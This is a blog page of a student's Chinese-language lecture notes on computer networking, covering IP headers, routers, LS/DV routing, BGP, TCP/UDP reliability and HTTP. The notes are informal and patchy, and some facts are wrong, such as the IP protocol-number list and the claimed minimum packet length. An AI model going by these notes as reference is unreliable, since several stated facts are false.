<h3 id="IPv4"><a href="#IPv4" class="headerlink" title="IPv4"></a>IPv4</h3><h4 id="目标1-parse-packet"><a href="#目标1-parse-packet" class="headerlink" title="目标1 parse packet"></a>目标1 parse packet</h4><ul>
<li>IP version number（4 bit），packet length（16 bit）</li>
</ul>
<h4 id="目标2-carry-packet-to-Destination"><a href="#目标2-carry-packet-to-Destination" class="headerlink" title="目标2 carry packet to Destination"></a>目标2 carry packet to Destination</h4><ul>
<li>destination packet addr（32 bit）</li>
</ul>
<h4 id="目标3-handle-problem"><a href="#目标3-handle-problem" class="headerlink" title="目标3 handle problem"></a>目标3 handle problem</h4><ol>
<li><p>preventing loops（TLL）<br> 为什么不用二层的 spanning tree？</p>
<ol>
<li>太大了不好剪</li>
<li><p>局域网里链路很便宜，广域网太贵了，一条光纤不能扔那不用</p>
<p>解决：<br>在包里加了 Time-to-Live（TTL）field（8 bit），每被发一次，TTL 就减一点，减到0就丢掉这个包<br>负责丢的路由器告诉 source 没发成</p>
</li>
</ol>
</li>
<li><p>corruption<br> checksum（16 bit），每发一次都计算一次 checksum，保证刚才一跳中包头未发生改变</p>
</li>
<li><p>fragmentation<br> frag（32 bit）</p>
</li>
<li><p>evolution<br> version number（4 bit）+ special handling</p>
<p> special handling：</p>
<ul>
<li>type of service（8 bit）</li>
</ul>
</li>
</ol>
<h3 id="IP-header-结构"><a href="#IP-header-结构" class="headerlink" title="IP header 结构"></a>IP header 结构</h3><p><img src="/2019/02/25/计网学习笔记/" alt="PPT完整图！"></p>
<h4 id="fragmentaion"><a href="#fragmentaion" class="headerlink" title="fragmentaion"></a>fragmentaion</h4><p>每个 link 有一个最大传输单元，从一段大链路到另一段小链路时需要切片加头。</p>
<p>Q: 何时重组？<br>A: 接收端重组比较好，不要让中间路由器做重组的事，否则</p>
<ol>
<li>影响效率</li>
<li>且包可以走很多条路，只有接收端这个唯一终点。</li>
<li>还能再被切更小</li>
</ol>
<p>体现了 E2E principle（中间节点傻，只干转发的事，终端智能）</p>
<p>切片重组需要</p>
<ol>
<li>知道是谁的分片</li>
<li>是第几片分片</li>
<li>还能继续切小</li>
</ol>
<p>fragmentation fields:</p>
<ol>
<li>identifier</li>
<li>flags</li>
<li>offset</li>
</ol>
<h3 id="IPv6-小览"><a href="#IPv6-小览" class="headerlink" title="IPv6 小览"></a>IPv6 小览</h3><ol>
<li>解决 IPv4 地址只有 32 bit IP 地址，地址不够的问题。进化到 128 bit 的地址，足以给太阳系内每一颗沙子分地址</li>
<li>简化 IPv4 里不必要的东西（</li>
</ol>
<h4 id="IPv6-哲学"><a href="#IPv6-哲学" class="headerlink" title="IPv6 哲学"></a>IPv6 哲学</h4><ol>
<li>don’t deal with problems: leave to ends（网络要做的只是传得快、不丢包）<ul>
<li>删去 fragmentation 和 checksum</li>
<li>保留 ttl</li>
</ul>
</li>
<li>simplify handling<ul>
<li>use next header</li>
<li>删去 header length</li>
</ul>
</li>
<li>provide general flow label for packet<ul>
<li>not tied to semantics(语义)</li>
<li>高灵活性</li>
</ul>
</li>
</ol>
<h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><ol>
<li>网络层可分为数据平面和控制平面<ul>
<li>数据平面负责转发</li>
<li>控制平面负责指挥</li>
</ul>
</li>
</ol>
<h2 id="IP-router"><a href="#IP-router" class="headerlink" title="IP router"></a>IP router</h2><p>IP router 的架构大大小小都差不多，差别就是吞吐量</p>
<p>如何评价 router？</p>
<ul>
<li>Router capacity = N * R</li>
<li>N = number of external router “ports”（有几个口）</li>
<li>R = speed(“line rate”) of a port（一个口有多快）</li>
</ul>
<p>router 分类：</p>
<ol>
<li>core</li>
<li>edge（两种，一种和别的运营商交互，另一种和自家用户交互）</li>
<li>small business（家庭用）</li>
</ol>
<h3 id="router-结构："><a href="#router-结构：" class="headerlink" title="router 结构："></a>router 结构：</h3><p><img src="/2019/02/25/计网学习笔记/" alt="router结构ppt"></p>
<h4 id="入线卡-input-linecards"><a href="#入线卡-input-linecards" class="headerlink" title="入线卡 input linecards"></a>入线卡 input linecards</h4><p>任务：</p>
<ul>
<li>接受发过来的数据包</li>
<li>更新 IP 包头<ul>
<li>TTL-1, checksum, options and fragment(ipv4)</li>
<li>TTL-1(ipv6)</li>
</ul>
</li>
<li>查本地的 forwarding table 去找 dest IP addr 的出端口</li>
</ul>
<p>挑战：speed<br>100B packets @ 40Gbps -&gt; new packet every 20 nano secs</p>
<p>IP 包最小长度 64 bit，路由器能力评价标准 是能处理最小的包是多小，因为这决定了速度</p>
<p>查 forwarding table</p>
<ul>
<li>1个端口对应一块地址，而不是1个 IP addr</li>
</ul>
<p>如何找端口呢？找端口主要是根据 IP addr 的网络号进行找</p>
<ol>
<li>软件方法：用树的结构，根据网络号一级级往下分</li>
<li>硬件方法：?</li>
</ol>
<h4 id="出线卡-output-linecards"><a href="#出线卡-output-linecards" class="headerlink" title="出线卡 output linecards"></a>出线卡 output linecards</h4><p>任务：</p>
<ul>
<li>分类：map packets to flows</li>
<li>决定何时、丢哪个包</li>
<li>传输哪个包（优先级）</li>
</ul>
<p>调度策略：</p>
<ol>
<li>fair</li>
<li>weighted</li>
</ol>
<h4 id="入卡和出卡的连接"><a href="#入卡和出卡的连接" class="headerlink" title="入卡和出卡的连接"></a>入卡和出卡的连接</h4><ol>
<li>共享一块内存（低端货</li>
<li>总线（低端货</li>
<li>系统内部网络，做到入口和出口间传输不互相干扰（有点像数电的可编程阵列？</li>
</ol>
<h4 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h4><ol>
<li>IP router 是因特网骨干</li>
<li>速度和公平</li>
</ol>
<h2 id="routing-算法"><a href="#routing-算法" class="headerlink" title="routing 算法"></a>routing 算法</h2><p>goal:</p>
<ol>
<li>find a path</li>
<li>make the state contained in forwarding tables meets our goal</li>
</ol>
<p>评价路由算法：</p>
<ol>
<li>有效正确，即收敛</li>
<li>收敛地越快越好</li>
</ol>
<h3 id="local-state-vs-global-view-of-state"><a href="#local-state-vs-global-view-of-state" class="headerlink" title="local state vs. global view of state"></a>local state vs. global view of state</h3><p>单看一个路由器，无法判断它正确与否。要判断正确（即是否能正确转发到目的地），得看全局。</p>
<h3 id="路由正确性的充要条件"><a href="#路由正确性的充要条件" class="headerlink" title="路由正确性的充要条件"></a>路由正确性的充要条件</h3><ol>
<li>没有死路（即不会出现一个路由器在接到包后，不知道这个数据包该往哪发）<pre><code>     （case 1, case 2, ..., default。default 来保证没有 dead ends)
</code></pre></li>
<li>没有环路</li>
</ol>
<h3 id="least-cost-path-routing（收敛的越快越好）"><a href="#least-cost-path-routing（收敛的越快越好）" class="headerlink" title="least-cost path routing（收敛的越快越好）"></a>least-cost path routing（收敛的越快越好）</h3><p>dijkstra 算法</p>
<h2 id="routing-协议（自治域内部）"><a href="#routing-协议（自治域内部）" class="headerlink" title="routing 协议（自治域内部）"></a>routing 协议（自治域内部）</h2><p>基于 dijkstra 算法</p>
<ul>
<li>link-state routing</li>
<li>distance-vector routing</li>
</ul>
<p>dijkstra 算法要知道全局的拓扑</p>
<p>工程做起来有两种方法：</p>
<ol>
<li>一个独立的 machine 计算完，再分发给各个节点</li>
<li>将全网拓扑广播给所以路由器，每个路由器都算一下，结果是一样的</li>
</ol>
<p>Internet 使用2</p>
<h3 id="link-state-routing"><a href="#link-state-routing" class="headerlink" title="link-state routing"></a>link-state routing</h3><p>每个节点都知道和自己直接相邻的路的 cost<br>每个节点都会把自己的状态广播给其他所有路由器，周期性地。<br>还有就是 cost 改变时也会广播。</p>
<p>洪泛过后大家重新计算 least-cost path</p>
<p>点数为 N, 边数为 E<br>复杂度 N*E</p>
<h4 id="何时洪泛？"><a href="#何时洪泛？" class="headerlink" title="何时洪泛？"></a>何时洪泛？</h4><p>洪泛不需要 routing 规则，直接发到广播端口的。所以在这里只能用洪泛不能用路由，因为路由还没建立呢。</p>
<ol>
<li>拓扑改变了（节点挂了，下线了）</li>
<li>cost 改变了</li>
<li>周期性的，告诉别人你还活着</li>
</ol>
<h4 id="收敛时延-convergence-delay"><a href="#收敛时延-convergence-delay" class="headerlink" title="收敛时延 convergence delay"></a>收敛时延 convergence delay</h4><p>时延太长会导致一台 router 还活在旧的状态理解里，搞不好会出环路</p>
<h4 id="收敛过程中可能发生"><a href="#收敛过程中可能发生" class="headerlink" title="收敛过程中可能发生"></a>收敛过程中可能发生</h4><ol>
<li>looping packets</li>
<li>包进死胡同丢了</li>
<li>由于发的过程中 path 可能改变，先发的数据后到了，而后发的数据先到了</li>
</ol>
<h4 id="复杂度"><a href="#复杂度" class="headerlink" title="复杂度"></a>复杂度</h4><ol>
<li>O(NE) messages 洪泛</li>
<li>O(N^2) computation time | dijkstra算法时间</li>
<li>O(network diameter) 收敛时延，主要是传播时延</li>
<li>O(N) entries in forwarding table</li>
</ol>
<h4 id="link-state-routing-协议"><a href="#link-state-routing-协议" class="headerlink" title="link-state routing 协议"></a>link-state routing 协议</h4><p>OSPF: open shortest path first</p>
<p>IS-IS: intermediate system to intermediate system</p>
<p><strong>讲到现在的所有协议都是 AS 内部的协议</strong></p>
<h3 id="distance-vector-协议"><a href="#distance-vector-协议" class="headerlink" title="distance-vector 协议"></a>distance-vector 协议</h3><p>router 不需要把自己的信息洪泛给全网，只要告诉邻居节点他对世界的看法就行了，这有益于分布式</p>
<h4 id="B-F-算法"><a href="#B-F-算法" class="headerlink" title="B-F 算法"></a>B-F 算法</h4><p>看 ppt 上的具体示例</p>
<p>节点 x 知道它到所有邻居的距离 d_i ，然后他的邻居 i 到目标的距离 dis_i 是已知的，所以只要遍历邻居，取 d_i + dis_i 之和的最小值即可。</p>
<p>节点发生改变时告诉它的邻居，然后向外更新 vector</p>
<h4 id="B-F-算法有的问题"><a href="#B-F-算法有的问题" class="headerlink" title="B-F 算法有的问题"></a>B-F 算法有的问题</h4><p>看 ppt 具体例子</p>
<ol>
<li>形成 routing loops，要互相丢包很久才能恢复到正确状态，期间没有包能被发送</li>
</ol>
<h4 id="解决办法-poinsoned-reverse-毒药逆转"><a href="#解决办法-poinsoned-reverse-毒药逆转" class="headerlink" title="解决办法 poinsoned reverse 毒药逆转"></a>解决办法 poinsoned reverse 毒药逆转</h4><p>若 z 经过 y 到达 x，那么 z 会告诉 y 自己到 x 的距离是 正无穷，这样 y 就不会考虑通过 z 到达 x。<br>否则 z 会告诉 y 它到 x 的真实距离。</p>
<p>x-y cost &lt; y-z cost</p>
<p>这样子假如 x-y 挂了，y 发现自己到 x 是无路可走的，y-x 更新为正无穷。这个消息传到 z，z-x 被启用，这个消息再正确的传给 y，y 就可以通过 z 到达 x 啦。</p>
<p>看 ppt 具体例子</p>
<h4 id="解决办法-path-routing"><a href="#解决办法-path-routing" class="headerlink" title="解决办法 path routing"></a>解决办法 path routing</h4><p>不单单广播距离，还广播向量，这样邻居就知道它之前是怎么走的了。（不考）</p>
<h3 id="LS-和-DV-不同点"><a href="#LS-和-DV-不同点" class="headerlink" title="LS 和 DV 不同点"></a>LS 和 DV 不同点</h3><p>信息告知：<br>LS: O(NE) 因为是全网洪泛<br>DV: O(E) 只要告诉邻居就行</p>
<p>收敛速度：<br>LS: 比较快<br>DV: 可能出现 loop，然后要一段时间才能恢复，即使用了毒药逆转</p>
<p>鲁棒性：（假定所有节点都是善意的）（节点挂了尽快恢复，且不出错就是鲁棒）<br>LS:</p>
<ul>
<li>可能广播错误的 link cost，然后影响其他节点</li>
<li>每个节点自己算自己的</li>
</ul>
<p>DV:</p>
<ul>
<li>可能传播错误的 path cost</li>
<li>每个节点算自己的，但别人还依赖你的计算结果，所以错误会蔓延</li>
</ul>
<h3 id="LS-和-DV-相似点"><a href="#LS-和-DV-相似点" class="headerlink" title="LS 和 DV 相似点"></a>LS 和 DV 相似点</h3><p>目的都是找最短路</p>
<p>用于同一个 AS 域内，都是友军</p>
<p>下节课讲 AS 之间的 routing</p>
<h2 id="routing-协议-（自治域之间）"><a href="#routing-协议-（自治域之间）" class="headerlink" title="routing 协议 （自治域之间）"></a>routing 协议 （自治域之间）</h2><p>IXP: 不提供服务，只负责交换 ISP 和 ISP 之间的信息，这样两个 ISP 之间就不用特地建立物理线了。（运营商间的交换机）</p>
<p>域间路由的挑战：</p>
<ol>
<li>全球寻址</li>
<li>管理<ul>
<li>自治管理，策略，隐私（可以不告诉对方自己的内部路由细节）</li>
</ul>
</li>
</ol>
<h3 id="scaling"><a href="#scaling" class="headerlink" title="scaling"></a>scaling</h3><p>路由器必须全球可达</p>
<p>一个操作就是把一个范围内的 IP 一个 entry。而不是一个 IP 一个 entry。</p>
<h3 id="管理"><a href="#管理" class="headerlink" title="管理"></a>管理</h3><p>涉及商业竞争：</p>
<ol>
<li>我不走我竞争者的网</li>
<li>我不让竞争者走我的网</li>
</ol>
<h3 id="域间路由算法"><a href="#域间路由算法" class="headerlink" title="域间路由算法"></a>域间路由算法</h3><p>丢弃 Link-state</p>
<ol>
<li>没隐私，因为要广播自己的世界看法</li>
<li>得商量 cost 咋定义</li>
</ol>
<p>distance-vector</p>
<ol>
<li>需要改进，叫 BGP</li>
<li>需要去环路</li>
<li>需要加入 policy</li>
</ol>
<h3 id="IPv4-设计（为了scaling）"><a href="#IPv4-设计（为了scaling）" class="headerlink" title="IPv4 设计（为了scaling）"></a>IPv4 设计（为了scaling）</h3><p>一段 host 地址一般全0，全1，01不能用（留给网关）</p>
<p>一开始分为 ABCD 四类地址，愚蠢的设计</p>
<p>CIDR: 无类别的</p>
<p>比如一个公司 50 台主机，2^5 &lt; 50 &lt; 2^6，移动就给你 32 - 6 = 26 位前缀，IP 范围就是 128.23.9/26。掩码 26 个 1，6 个 0</p>
<p>大运营商层层分 IP，比如分给南大一段，南大再给下面的机子分配，运营商联系南大的时候，不需要知道南大下面的具体细节，只要知道是发往南大就行，剩下来的事情交给南大的路由器。</p>
<p>这就是聚合。</p>
<h3 id="AS-之间的关系"><a href="#AS-之间的关系" class="headerlink" title="AS 之间的关系"></a>AS 之间的关系</h3><p>AS A 可以是 B 的客户（付钱）</p>
<p>可以是 B 的提供商（付钱）</p>
<p>可以是 B 的对端，有双向合作的那种（互相不收钱，交换起来数据比不能过 1:3 或 3:1，在这个范围内不收钱，超了就收钱了）</p>
<h3 id="为什么会有-peer？"><a href="#为什么会有-peer？" class="headerlink" title="为什么会有 peer？"></a>为什么会有 peer？</h3><p>本来因特网是树，只有上下级关系，但因为钱，同级别的可以不经过上层传，而是直接传</p>
<p><img src="/2019/02/25/计网学习笔记/" alt="routing follows the money 图片"></p>
<p>B 没有义务帮 A 和 C 省钱，所以 D 走到 E 不能通过 A-B-C 路</p>
<p>域间路由的第一要义不是最短路！是省钱！题目分析是要看 经过的路上的 AS 是不是得到了利益，没得到就不能过这个 AS。</p>
<p>以及，不会先向下走再向上走。因为下层没有义务帮上层的 AS 传数据，不赚钱。</p>
<h3 id="BGP-协议"><a href="#BGP-协议" class="headerlink" title="BGP 协议"></a>BGP 协议</h3><p>先选一条 ASes 路，这条路反映了 物理链路通达 且 有商业关系。</p>
<p>两个 AS 的边防局互相交流就是 “讲 BGP 语言”</p>
<p>类似 DV，一个 AS 广播它到某一个 IP 域的 cost</p>
<h4 id="BGP-和-DV-的区别"><a href="#BGP-和-DV-的区别" class="headerlink" title="BGP 和 DV 的区别"></a>BGP 和 DV 的区别</h4><ol>
<li>不一定选最短路（钱）</li>
<li>path-vector 广播到某个 IP 网络的 path，而不只是距离，这样就可以避免环路了，还可以自己选择路径</li>
<li>广播策略可选，比如可以不广播</li>
<li>aggregate route，目的地址都在一起，可以合并以减少路由表</li>
</ol>
<h4 id="路怎么选"><a href="#路怎么选" class="headerlink" title="路怎么选"></a>路怎么选</h4><ul>
<li>为了赚钱，路由的路选哪好？customer &gt; peer &gt; provider</li>
<li>最大化 performance，最短 AS path 长度</li>
<li>最小化带宽，热土豆策略</li>
</ul>
<p>Gao-Rexford：<br>路由不往下走？<br>AS policy graph 应当是有向无环图</p>
<p>边防局 border routers</p>
<p>RFC: request for comments 制定于每年三次的 ietf 会议</p>
<h4 id="eBGP-iBGP-IGP"><a href="#eBGP-iBGP-IGP" class="headerlink" title="eBGP, iBGP, IGP"></a>eBGP, iBGP, IGP</h4><p>eBGP: 边防局交流</p>
<p>iBGP: 边防局和内部人员交流（学习外交部文件，交给内部人员学习）</p>
<p>IGP: 内部人员交流</p>
<h4 id="BGP-中的基本信息"><a href="#BGP-中的基本信息" class="headerlink" title="BGP 中的基本信息"></a>BGP 中的基本信息</h4><p>Open: 验明身份</p>
<p>notification：报故障</p>
<p>update：</p>
<p>keep alive：</p>
<h4 id="attributes"><a href="#attributes" class="headerlink" title="attributes"></a>attributes</h4><ol>
<li><p>AS path 矢量（每个 AS 都有独立编号）</p>
</li>
<li><p>local preference（对内消息，有多条出去的路的情况下，告诉内部人员走哪比较好，机密）</p>
</li>
<li><p>MED: multi-exit discriminator（对于每个 IP 的前缀，指定走哪里，南京的联通和移动通话没必要走到北京再走回来）</p>
</li>
<li><p>IGP cost（hot-potato）</p>
</li>
</ol>
<h4 id="可达问题"><a href="#可达问题" class="headerlink" title="可达问题"></a>可达问题</h4><p>不一定</p>
<h4 id="安全问题（想断就断，不想断就让他连着）"><a href="#安全问题（想断就断，不想断就让他连着）" class="headerlink" title="安全问题（想断就断，不想断就让他连着）"></a>安全问题（想断就断，不想断就让他连着）</h4><h4 id="收敛问题"><a href="#收敛问题" class="headerlink" title="收敛问题"></a>收敛问题</h4><p>很可能收敛不了</p>
<h1 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h1><p>传输层是端到端的</p>
<p>存在的意义：比如 NJU x 楼 x 宿舍 -&gt; PKU y 楼 y 宿舍，网络层就编址到这里，NJUer 对 PKUer 发文件、发 QQ 经过不同的端口？<br>NJUer 需要复用物理地址，PKUer 需要解复用</p>
<p>IP 层保证全球可达（但不是一定到达），包会 崩溃、延迟、丢包、乱序、重复包（电子设备出错、对抗前面的问题）<br>传输层需要提供手段解决上述问题（这些问题不交由网络层解决的原因是：不是所有业务都需要稳得一批，低价看视频就不用）</p>
<p>传输层要告诉 网络层 传多块（速度），比如传输层知道某个路由器拥堵了，那就发慢点让它能处理</p>
<h2 id="Ports"><a href="#Ports" class="headerlink" title="Ports"></a>Ports</h2><p>区分是哪个应用在发包</p>
<p>端口号自动分配，NJU 某机子一个端口，PKU 某机子一个端口，返回 1024~65536 ?</p>
<p>UDP 与 TCP 区别：<br>UDP</p>
<ul>
<li>不保证传达到</li>
<li>不面向连接，丢出去就完事了，野蛮人的交流方式</li>
</ul>
<p>TCP</p>
<ul>
<li>保证送达，发不到的会重发等等</li>
<li>面向连接，要握手，文明人的交流方式</li>
</ul>
<h3 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h3><p>一直没怎么更新过，简陋但简单</p>
<p>包头就</p>
<ul>
<li>src port（这都可以不给，意思就是不需要你回复我）（每个主机一个 16 bit 的 port号）</li>
<li>dst port</li>
<li>length</li>
<li>checksum（可以置为0，意思就是别检查我了，对不对和你没关系）</li>
</ul>
<h3 id="TCP-简介"><a href="#TCP-简介" class="headerlink" title="TCP 简介"></a>TCP 简介</h3><p>精致，啥都干了</p>
<h4 id="处理机制"><a href="#处理机制" class="headerlink" title="处理机制"></a>处理机制</h4><p>一系列对抗机制 Mechanisms，来处理 bad events</p>
<ul>
<li>checksum</li>
<li>ACK（没收到）</li>
<li>NACK（没收到</li>
<li>Sequence number</li>
<li>Retransmission</li>
<li>timeout</li>
<li>forward error correction</li>
</ul>
<h4 id="检错、纠错"><a href="#检错、纠错" class="headerlink" title="检错、纠错"></a>检错、纠错</h4><p>checksum</p>
<h4 id="告诉发送端发生了啥"><a href="#告诉发送端发生了啥" class="headerlink" title="告诉发送端发生了啥"></a>告诉发送端发生了啥</h4><p>ACK/NACK</p>
<p>PPT 图</p>
<p>如果 ACK/NACK 包出错，那么也再发一遍 ACK/NACK（对于发送端来说，它只感受到刚发的没发好）</p>
<p>如果 A-&gt;B P1(yes), B-&gt;A ACK(no), A 重发 B P1，如果不编号，那么 B 不知道收到的是第几个包<br>所以要用 sequence number</p>
<h4 id="处理丢包"><a href="#处理丢包" class="headerlink" title="处理丢包"></a>处理丢包</h4><p>PPT 图</p>
<p>用 Timeout，如果过了时间没收到回复，那就重新发</p>
<p>会有伪丢包现象，只是传的慢了，确实可达了，但 timeout 超了</p>
<h4 id="具体算法"><a href="#具体算法" class="headerlink" title="具体算法"></a>具体算法</h4><h5 id="stop-and-wait"><a href="#stop-and-wait" class="headerlink" title="stop and wait"></a>stop and wait</h5><p>@sender</p>
<ol>
<li>send, then wait</li>
<li>if(ack) i++; repeat;</li>
<li>if(nack/timeout) repeat;</li>
</ol>
<p>弊端：不高效，因为 send 1 个 data 时间少，等待时间 RTT 太长！</p>
<p>效率 = data/RTT</p>
<p>在广域网情况下，带宽利用率会很低！<br>但如果很短的线直连，利用率还是挺高的</p>
<h5 id="sliding-window"><a href="#sliding-window" class="headerlink" title="sliding window"></a>sliding window</h5><p>PPT 图</p>
<p>窗里 记录应当在传输，而还未确认的那些包</p>
<p>一次发一批，发送端和接收端维护相同长度的滑动窗</p>
<p>效率 = min{n*data/RTT, link bandwidth}</p>
<p>n 太大的情况下（一次传的超过带宽），包会堆积，然后丢包</p>
<p>接收端收到了一个包就滑动一格，然后顺便发出 ack，然后发送端收到 ack 后也滑动一格。</p>
<h6 id="如何确认"><a href="#如何确认" class="headerlink" title="如何确认"></a>如何确认</h6><ol>
<li>cumulative ack</li>
</ol>
<p>每次收到连续的 包 时更新 ack 的编号，再发</p>
<p>如果中间有一个没收到，那么后面的包都不发 ack 了</p>
<ol>
<li>selective ack</li>
</ol>
<p>每次收到都更新 ack 编号，发（导致 ack 数量很多，这是消耗）</p>
<p>这样可以直接定位丢了哪个</p>
<h6 id="如何重传"><a href="#如何重传" class="headerlink" title="如何重传"></a>如何重传</h6><ol>
<li>Go-back-N（逻辑简单，多用硬件实现，超级计算机常用）</li>
</ol>
<p>发送端按序发送（12345），接收端按序接受（12 45），其中 3 在路上丢了，则接收端没收到 3，就把 45 都丢了，然后无作为，发送端的 timeout 到了没收到 3 的 ack，察觉到 3 丢了，则发送端把 345.. 都重传</p>
<p>要求错误率极低，这样效率才不会很差（1% 的错误率就 gg 了）</p>
<ol>
<li>selective repeat</li>
</ol>
<p>发送端按序发送（12345），接收端按序接受（12 45），其中 3 在路上丢了，则接收端没收到 3，就把 45 都 buffer 存住先不提交给应用层，回 45 的 ack，接收端的 timeout 到了没收到 3 的 ack，察觉到 3 丢了，重传 3，接收端收到 3 之后再将 3 和 buffered 45 拼起来，再提交给应用层。</p>
<p>适用广域网（TCP 用的就是这个）</p>
<h3 id="TCP-详细"><a href="#TCP-详细" class="headerlink" title="TCP 详细"></a>TCP 详细</h3><h4 id="TCP-头部"><a href="#TCP-头部" class="headerlink" title="TCP 头部"></a>TCP 头部</h4><p>PPT 图</p>
<p>（checksum 算的时候先把 checksum 设定一个初始值，再算完 checksum 写回去。）</p>
<p>头里的 sequence number 不是包的编号，是 byte offset，做字节定位用的</p>
<h4 id="TCP-段"><a href="#TCP-段" class="headerlink" title="TCP 段"></a>TCP 段</h4><p>基于字节流，但不是一字节一字节发，也不是一个大东西发，而是分成段再发</p>
<p>分段条件；</p>
<ol>
<li>比如传一个大文件，一个段装不下，那么分成段</li>
<li>段没满但时间到了，也发的情况，比如敲命令</li>
</ol>
<p>段的大小：</p>
<ul>
<li>不超过最大传输单元大小 (缩写 MTU)（以太网 1500 byte）</li>
<li>IP 包头不带选项是 20 字节，TCP 包头 20 字节，那么最大不超过 1460</li>
</ul>
<h4 id="TCP-sequence-number、acknowledgement"><a href="#TCP-sequence-number、acknowledgement" class="headerlink" title="TCP sequence number、acknowledgement"></a>TCP sequence number、acknowledgement</h4><p>seqno 是我正在发送的数据位于数据流的哪个位置</p>
<p>sender: seqno = X, length = B<br>recv: ack = X + B</p>
<p>sender: seqno = X + B, length = B<br>recv: ack = X + 2B</p>
<p>…</p>
<h4 id="如果丢包了"><a href="#如果丢包了" class="headerlink" title="如果丢包了"></a>如果丢包了</h4><p>比如一个包 100B，期望 seqno 如下<br>100, 200, 300, 400, 500, 600</p>
<p>假如第五个丢了，即第 500~599 字节丢了，ack 为 200,300,400,500(seqno 600),500(seqno 700)…</p>
<p>快速重传：不用等 timeout 耗尽，改为：看PPT，我课上没听到</p>
<h4 id="timeout-怎么设定"><a href="#timeout-怎么设定" class="headerlink" title="timeout 怎么设定"></a>timeout 怎么设定</h4><p>采样得到 sampleRTT</p>
<p>estimateRTT = (1-a) <em> old_estimateRTT + a </em> sampleRTT</p>
<h3 id="TCP-建立过程"><a href="#TCP-建立过程" class="headerlink" title="TCP 建立过程"></a>TCP 建立过程</h3><p>进行三次握手</p>
<p>ISN 不是从 0 开始编号的</p>
<p><em>*</em> 2019-5-20 断线重连</p>
<h2 id="TCP-缺陷"><a href="#TCP-缺陷" class="headerlink" title="TCP 缺陷"></a>TCP 缺陷</h2><ol>
<li><p>misled by non-congetion losses</p>
</li>
<li><p>fills up queues leading to high delays</p>
</li>
<li><p>short flows comlete before discovering availale capacity</p>
</li>
<li><p>AIMD impractical for high speed links</p>
</li>
<li><p>saw tooth discovery too choppy for some apps</p>
</li>
<li><p>unfair under heterogeneous RTTs</p>
</li>
<li><p>tight couplin with reliablity mechanisms</p>
</li>
<li><p>end host can cheat</p>
</li>
</ol>
<h3 id="7-cheating"><a href="#7-cheating" class="headerlink" title="7 cheating"></a>7 cheating</h3><h3 id="8-Implications"><a href="#8-Implications" class="headerlink" title="8 Implications"></a>8 Implications</h3><p>P2P 传输早期被禁止，开多个 tcp 连接，带宽占满</p>
<h2 id="TCP-缺陷解决"><a href="#TCP-缺陷解决" class="headerlink" title="TCP 缺陷解决"></a>TCP 缺陷解决</h2><h3 id="借助路由器"><a href="#借助路由器" class="headerlink" title="借助路由器"></a>借助路由器</h3><ol>
<li>发现拥塞</li>
<li>调整达到公平</li>
</ol>
<h4 id="公平针对欺骗"><a href="#公平针对欺骗" class="headerlink" title="公平针对欺骗"></a>公平针对欺骗</h4><p>数据包都塞入流中，轮转</p>
<h4 id="ECN"><a href="#ECN" class="headerlink" title="ECN"></a>ECN</h4><p>多用于数据中心</p>
<h4 id="终极解决，给钱"><a href="#终极解决，给钱" class="headerlink" title="终极解决，给钱"></a>终极解决，给钱</h4><h4 id="大企业解决办法"><a href="#大企业解决办法" class="headerlink" title="大企业解决办法"></a>大企业解决办法</h4><p>自己接管拥塞控制，方法是 UDP+应用层 Quic，这样快速</p>
<h1 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h1><h2 id="NAT"><a href="#NAT" class="headerlink" title="NAT"></a>NAT</h2><p>翘课</p>
<h2 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h2><p>翘课</p>
<h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><p>最早出现在欧洲核子中心</p>
<p>HTTP/1.1 明文表示，便于调试，消耗空间</p>
<p>HTTP/2 二进制表示，省空间</p>
<h3 id="Web-组成部分"><a href="#Web-组成部分" class="headerlink" title="Web 组成部分"></a>Web 组成部分</h3><p>客户端-用户</p>
<p>URL 全球资源标识</p>
<p>资源格式 HTML</p>
<h4 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h4><p>protocol://host-name[:port]/directory-path/resource</p>
<h4 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h4><p>GET, HEAD</p>
<p>POST, PUT, DELETE</p>
<h4 id="cookies"><a href="#cookies" class="headerlink" title="cookies"></a>cookies</h4><p>为无状态的 HTTP 加上状态，这个状态不放在服务器端，放在客户端 </p>
<h1 id="复习课"><a href="#复习课" class="headerlink" title="复习课"></a>复习课</h1><h2 id="ICMP"><a href="#ICMP" class="headerlink" title="ICMP"></a>ICMP</h2><p>TTL 防止包永生</p>
<p>traceroute 对动态路由不管用，即每次 traceroute 的结果可能不一样，因为中间路由器可能会针对负载改走别的路</p>
<h2 id="ip协议类型"><a href="#ip协议类型" class="headerlink" title="ip协议类型"></a>ip协议类型</h2><p>1 ip</p>
<p>6 tcp</p>
<p>7 udp</p>
<h1 id="导论"><a href="#导论" class="headerlink" title="导论"></a>导论</h1><h2 id="包交换-电路交换"><a href="#包交换-电路交换" class="headerlink" title="包交换-电路交换"></a>包交换-电路交换</h2><h2 id="统计复用"><a href="#统计复用" class="headerlink" title="统计复用"></a>统计复用</h2><h2 id="如何刻画一条链路的特征"><a href="#如何刻画一条链路的特征" class="headerlink" title="如何刻画一条链路的特征"></a>如何刻画一条链路的特征</h2><p>带宽，点到点</p>
<h2 id="OSI-模型和-TCP-IP-模型"><a href="#OSI-模型和-TCP-IP-模型" class="headerlink" title="OSI 模型和 TCP-IP 模型"></a>OSI 模型和 TCP-IP 模型</h2><p>OSI 七层，TCP-IP 五层</p>
<p>考一个设备是第几层的</p>
<h2 id="时延由那几个部分组成"><a href="#时延由那几个部分组成" class="headerlink" title="时延由那几个部分组成"></a>时延由那几个部分组成</h2><h2 id="包是怎么封装-解封的"><a href="#包是怎么封装-解封的" class="headerlink" title="包是怎么封装/解封的"></a>包是怎么封装/解封的</h2><p>给定链路层 MTU，给头部大小，问应用层数据该有多大</p>
<p>中间路由器会不会分片</p>
